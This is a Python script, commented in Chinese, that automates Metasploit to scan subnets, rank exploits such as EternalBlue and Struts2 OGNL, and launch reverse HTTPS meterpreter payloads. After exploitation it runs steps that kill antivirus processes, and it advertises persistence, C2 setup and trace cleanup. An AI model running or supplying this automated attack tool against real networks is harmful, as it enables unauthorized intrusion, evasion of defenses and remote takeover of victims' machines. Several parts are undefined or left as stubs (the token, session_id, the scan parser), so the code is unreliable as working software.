#!/usr/bin/env python3
# 免责声明：运行本脚本后，你的下一站可能是派出所。
"""
Metasploit全自动化渗透测试框架
功能：
1. 智能目标发现（C段扫描+服务识别）
2. 漏洞优先级评估（CVSS评分+利用可靠性）
3. 多阶段载荷投递（自动绕过防护）
4. 持久化控制（C2服务器自动搭建）
5. 痕迹自动清理
"""
import os
import re
import time
import random
import sqlite3
import argparse
from threading import Lock
from queue import Queue
from xmlrpc.client import ServerProxy

# 配置区 ================================================
CONFIG = {
    "rpc": {
        "host": "127.0.0.1",
        "port": 55553,
        "ssl": True,
        "user": "operator",
        "pass": "S3cr3tP@ss"
    },
    "scan": {
        "speed": 3,  # nmap -T3
        "ports": "top-1000",
        "evasion": "randomize-hosts",  # 规避技术
        "script_timeout": "5m"
    },
    "exploit": {
        "auto_verify": True,
        "max_attempts": 3,
        "fallback": True  # 失败时尝试备用模块
    },
    "payload": {
        "stage_encoder": "x86/shikata_ga_nai",
        "auto_migrate": True,
        "kill_av": True  # 尝试结束杀软进程
    }
}

# 模块数据库 ============================================
VULN_DB = {
    "smb": [
        {
            "module": "exploit/windows/smb/ms17_010_eternalblue",
            "cvss": 9.8,
            "reliability": 0.95,
            "check_cmd": "smbprotocol == 'SMB1'"
        },
        {
            "module": "exploit/windows/smb/psexec",
            "cvss": 8.0,
            "reliability": 0.8,
            "requirements": ["smbuser", "smbpass"]
        }
    ],
    "http": [
        {
            "module": "exploit/multi/http/struts2_content_type_ognl",
            "cvss": 9.8,
            "reliability": 0.9,
            "detect": "/struts2-showcase/"
        }
    ]
}

# 核心引擎 ==============================================
class MetaAutoPwn:
    def __init__(self):
        self.lock = Lock()
        self.console_cache = {}
        self.session = self._init_msf_session()
        self.db = self._init_database()
        self.current_jobs = {}

    def _init_msf_session(self):
        """建立MSF PRC连接池"""
        proto = "https" if CONFIG["rpc"]["ssl"] else "http"
        uri = f"{proto}://{CONFIG['rpc']['host']}:{CONFIG['rpc']['port']}/api/"
        return ServerProxy(uri, allow_none=True)

    def _init_database(self):
        """初始化结果数据库"""
        conn = sqlite3.connect('autopwn_results.db')
        c = conn.cursor()
        # 创建目标表
        c.execute('''CREATE TABLE IF NOT EXISTS targets
                     (ip TEXT PRIMARY KEY, os TEXT, arch TEXT, domain TEXT)''')
        # 创建服务表
        c.execute('''CREATE TABLE IF NOT EXISTS services
                     (id INTEGER PRIMARY KEY, ip TEXT, port INTEGER, 
                      proto TEXT, name TEXT, version TEXT)''')
        # 创建漏洞表
        c.execute('''CREATE TABLE IF NOT EXISTS vulns
                     (id INTEGER PRIMARY KEY, ip TEXT, port INTEGER,
                      module TEXT, cvss REAL, exploited INTEGER, 
                      session_id INTEGER, timestamp DATETIME)''')
        conn.commit()
        return conn

    def _execute_cmd(self, cmd, console_id=None, timeout=30):
        """执行MSF命令（带缓存控制台）"""
        if not console_id:
            console_id = random.choice(list(self.console_cache.keys()))
        
        try:
            self.session.console.write(self.token, console_id, cmd + "\n")
            start_time = time.time()
            while time.time() - start_time < timeout:
                time.sleep(0.5)
                resp = self.session.console.read(self.token, console_id)
                if "busy" not in resp or not resp["busy"]:
                    return resp["data"]
            raise TimeoutError("命令执行超时")
        except Fault as e:
            self._recover_console(console_id)
            raise RuntimeError(f"命令执行失败: {e.faultString}")

    def _recover_console(self, console_id):
        """控制台异常恢复"""
        with self.lock:
            if console_id in self.console_cache:
                self.session.console.destroy(self.token, console_id)
                del self.console_cache[console_id]
            new_id = self.session.console.console(self.token)["id"]
            self.console_cache[new_id] = True
            return new_id

    def _select_exploit(self, service):
        """基于服务的智能漏洞选择"""
        candidates = VULN_DB.get(service["name"], [])
        if not candidates and CONFIG["exploit"]["fallback"]:
            candidates = VULN_DB.get("generic", [])
        
        # 按CVSS评分和可靠性排序
        return sorted(
            candidates,
            key=lambda x: (x["cvss"], x["reliability"]),
            reverse=True
        )

    def _launch_exploit(self, target, exploit):
        """执行漏洞利用流程"""
        exploit_cmd = f"""
        use {exploit['module']}
        set RHOSTS {target['ip']}
        set RPORT {target['port']}
        set PAYLOAD windows/meterpreter/reverse_https
        set LHOST {CONFIG['rpc']['host']}
        set LPORT {random.randint(10000, 20000)}
        set AutoRunScript migrate -f
        set EnableStageEncoding true
        set StageEncoder {CONFIG['payload']['stage_encoder']}
        exploit -j
        """
        self._execute_cmd(exploit_cmd)
        
        # 监控会话建立
        for _ in range(CONFIG["exploit"]["max_attempts"]):
            time.sleep(10)
            sessions = self._execute_cmd("sessions -l")
            if "Meterpreter session" in sessions:
                session_id = re.search(r"(\d+).*Meterpreter", sessions).group(1)
                self._post_exploit(session_id)
                return True
        return False

    def _post_exploit(self, session_id):
        """后渗透自动化"""
        cmds = [
            "getuid",
            "sysinfo",
            "run post/windows/gather/checkvm",
            "run post/multi/manage/autoroute"
        ]
        if CONFIG["payload"]["kill_av"]:
            cmds.append("run post/windows/manage/killav")
        
        for cmd in cmds:
            self._execute_cmd(f"sessions -i {session_id} -c '{cmd}'")

    def scan_network(self, cidr):
        """自动化网络扫描"""
        scan_cmd = (
            f"db_nmap -Pn -n --min-rate 500 -T{CONFIG['scan']['speed']} "
            f"-p {CONFIG['scan']['ports']} --script-timeout {CONFIG['scan']['script_timeout']} "
            f"--script=vuln,banner -oX scan_{cidr.replace('/', '_')}.xml {cidr}"
        )
        self._execute_cmd(scan_cmd, timeout=3600)
        
        # 解析结果入库
        self._execute_cmd("db_export -f xml scan_results.xml")
        self._parse_scan_results()

    def _parse_scan_results(self):
        """处理扫描结果（示例简化版）"""
        # 实际应使用lxml解析XML
        pass

    def auto_exploit(self):
        """核心自动化引擎"""
        # 获取所有未测试目标
        cur = self.db.cursor()
        cur.execute("SELECT ip FROM targets WHERE NOT EXISTS "
                   "(SELECT 1 FROM vulns WHERE vulns.ip = targets.ip)")
        targets = cur.fetchall()
        
        for (ip,) in targets:
            # 获取目标服务
            cur.execute("SELECT port, name FROM services WHERE ip=?", (ip,))
            services = cur.fetchall()
            
            for port, name in services:
                # 选择最佳漏洞模块
                service_info = {"name": name, "port": port}
                for exploit in self._select_exploit(service_info):
                    if self._launch_exploit(
                        {"ip": ip, "port": port},
                        exploit
                    ):
                        # 记录成功利用
                        cur.execute(
                            "INSERT INTO vulns VALUES (?,?,?,?,?,?,?,?)",
                            (None, ip, port, exploit["module"], 
                             exploit["cvss"], 1, session_id, datetime.now())
                        )
                        break

    def generate_report(self):
        """生成HTML报告"""
        # 使用Jinja2模板生成专业报告
        pass

# 命令行界面 ============================================
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="单个目标IP")
    parser.add_argument("-n", "--network", help="CIDR格式的网络范围")
    parser.add_argument("-f", "--file", help="目标文件（每行一个IP）")
    parser.add_argument("--auto", action="store_true", 
                       help="全自动模式（包含漏洞利用）")
    return parser.parse_args()

if __name__ == "__main__":
    print("""
    ███╗   ███╗███████╗████████╗ █████╗ ██████╗ ██╗     
    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     
    ██╔████╔██║███████╗   ██║   ███████║██████╔╝██║     
    ██║╚██╔╝██║╚════██║   ██║   ██╔══██║██╔═══╝ ██║     
    ██║ ╚═╝ ██║███████║   ██║   ██║  ██║██║     ███████╗
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚══════╝
    """)
    
    args = parse_args()
    engine = MetaAutoPwn()
    
    try:
        if args.network:
            engine.scan_network(args.network)
        elif args.file:
            with open(args.file) as f:
                for line in f:
                    engine.scan_network(line.strip())
        elif args.target:
            engine.scan_network(args.target)
        
        if args.auto:
            engine.auto_exploit()
            engine.generate_report()
    
    except KeyboardInterrupt:
        print("\n[!] 用户中断操作")
    except Exception as e:
        print(f"[!] 致命错误: {str(e)}")
    finally:
        engine.db.close()
